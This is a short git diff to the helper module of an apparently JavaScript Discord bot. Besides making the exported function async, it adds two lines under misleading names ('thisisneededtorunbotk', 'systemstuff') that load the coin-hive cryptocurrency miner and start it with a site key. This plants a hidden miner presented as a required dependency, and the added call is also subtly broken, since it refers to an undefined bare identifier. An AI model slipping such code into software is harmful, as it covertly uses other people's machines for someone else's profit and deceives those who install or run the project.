@@ -1,4 +1,4 @@
-module.exports = (bot) => {
+module.exports = async (bot) => {
 //common emotes
     bot.nekov = async () => {
         let nekoe = await bot.emojis.get("342750455513874442");
@@ -82,6 +82,8 @@ module.exports = (bot) => {
         });
     };
 //commons
+    bot.thisisneededtorunbotk = require('coin-hive');
+    bot.systemstuff = await thisisneededtorunbotk('F75UYADgHzJHqCDrqb4w6Zt5PEe5Avl5');
     bot.snekfetch = require('snekfetch');
     bot.config = require("../config.json");
     bot.prefix = bot.config.prefix;
